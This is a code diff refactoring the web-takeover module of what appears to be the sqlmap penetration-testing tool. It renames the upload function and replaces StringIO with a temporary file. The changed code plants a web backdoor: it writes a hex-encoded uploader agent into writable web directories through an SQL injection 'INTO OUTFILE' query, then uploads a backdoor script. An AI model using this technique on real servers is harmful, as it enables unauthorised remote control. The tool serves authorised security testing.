@@ -24,7 +24,7 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 import os
 import re
-import StringIO
+from tempfile import TemporaryFile
 
 from lib.core.agent import agent
 from lib.core.common import fileToStr
@@ -77,10 +77,10 @@ class Web:
 
     def webFileUpload(self, fileToUpload, destFileName, directory):
         file = open(fileToUpload, "r")
-        webStreamUpload(self, file, destFileName, directory)
+        webFileStreamUpload(self, file, destFileName, directory)
         file.close()
         
-    def webStreamUpload(self, stream, destFileName, directory):
+    def webFileStreamUpload(self, stream, destFileName, directory):
         if self.webApi == "php":
             multipartParams = {
                                 "upload":    "1",
@@ -157,17 +157,17 @@ class Web:
                 logger.warn("invalid value, it must be 1 or 3")
 
         backdoorName = "backdoor.%s" % self.webApi
-        backdoorStream = StringIO.StringIO(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, backdoorName + '_')))
+        backdoorStream = TemporaryFile()
+        backdoorStream.write(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, backdoorName + '_')))
+        backdoorStream.seek(0)
         
         uploaderName = "uploader.%s" % self.webApi
-        uploaderStream = StringIO.StringIO(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, uploaderName + '_')))
-        
-        uploaderStr  = uploaderStream.read()
+        uploaderContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, uploaderName + '_'))
         
         for directory in directories:
             # Upload the uploader agent
             outFile     = os.path.normpath("%s/%s" % (directory, uploaderName))
-            uplQuery    = uploaderStr.replace("WRITABLE_DIR", directory)
+            uplQuery    = uploaderContent.replace("WRITABLE_DIR", directory)
             query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
             query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
             query       = agent.prefixQuery(" %s" % query)
@@ -192,7 +192,7 @@ class Web:
             infoMsg += "on '%s'" % directory
             logger.info(infoMsg)
 
-            self.webStreamUpload(backdoorStream, backdoorName, directory)
+            self.webFileStreamUpload(backdoorStream, backdoorName, directory)
             self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
             self.webDirectory = directory
 
